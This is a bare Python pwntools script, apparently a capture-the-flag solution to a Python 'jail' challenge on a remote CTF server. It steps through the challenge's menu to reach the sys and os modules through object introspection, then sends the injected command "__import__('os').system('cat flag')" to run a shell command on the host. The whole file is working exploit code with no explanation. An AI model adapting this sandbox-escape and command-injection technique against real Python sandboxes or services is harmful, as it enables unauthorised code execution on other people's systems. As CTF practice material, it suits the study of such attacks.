#!/usr/bin/env python3

from pwn import *

host, port = "jail.chal.ctf.gdgalgiers.com", 1301
command = "__import__('os').system('cat flag')"

r = remote(host,port)

def pass_menu():
	r.recvuntil("--> ")

def explore_dir(ind):
	pass_menu()
	r.sendline("1")
	r.recvuntil("-> ")
	r.sendline(ind)

def check_subclasses(ind):
	pass_menu()
	r.sendline("2")
	r.recvuntil("-> ")
	r.sendline(ind)

def done():
	pass_menu()
	r.sendline("5")

def main():
	check_subclasses("-20")
	explore_dir("11")
	explore_dir("16")
	r.recvuntil("-> ")
	r.sendline("sys")
	explore_dir("-6")
	explore_dir("-19")
	done()

	check_subclasses("-20")
	explore_dir("11")
	explore_dir("16")
	r.recvuntil("-> ")
	r.sendline("sys")
	explore_dir("0")
	done()

	r.sendline(command)
	print(r.recvline())


if __name__ == '__main__':
	main()
